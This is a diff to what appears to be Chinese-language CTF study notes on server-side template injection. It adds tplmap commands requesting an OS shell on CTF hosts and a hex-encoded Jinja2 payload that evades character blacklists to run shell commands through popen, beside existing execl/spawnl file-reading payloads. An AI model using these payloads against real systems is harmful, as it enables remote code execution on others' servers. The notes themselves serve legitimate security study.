@@ -60,7 +60,11 @@ fetch(`/getflag\)
 #### SSTI - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/)
 * 先確認是不是真的有這個問題: {% raw %}`{{7*7}}`{% endraw %} → 49
 * 用[tplmap](https://github.com/epinna/tplmap)直接打
-* Python(Flask): Jinja
+    ```bash
+    $ ./tplmap.py --engine Jinja2 --os-shell -u "http://rescued-float.picoctf.net:56957/announce" -X POST -d "content=bob"
+    $ ./tplmap.py --engine pug --os-shell -u "http://h4ck3r.quest:8008/?name=bob"
+    ```
+* Python(Flask): Jinja2
 * Node.js(Express): PUG / EJS
 * SSTI Payload: 記得找<span style="background-color: yellow">os.\_wrap_close</span>
     {% raw %}
@@ -72,7 +76,14 @@ fetch(`/getflag\)
     {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", file.lower())}}
     {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['spawnl']('P_WAIT', "/bin/cat", "cat", file.lower())}}
     ```
+
+    [](https://onsecurity.io/article/server-side-template-injection-with-jinja2/): 如果`.`, `|`, `_`, `[]`, `|join`這幾個字元是黑名單，可以嘗試用hex
+    ```
+    {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
+    ```
     {% endraw %}
+
+    
 
 ### LFI
 只是能讀取到victim server上的file content，不見得會有價值，需要搭配其他手法，例如
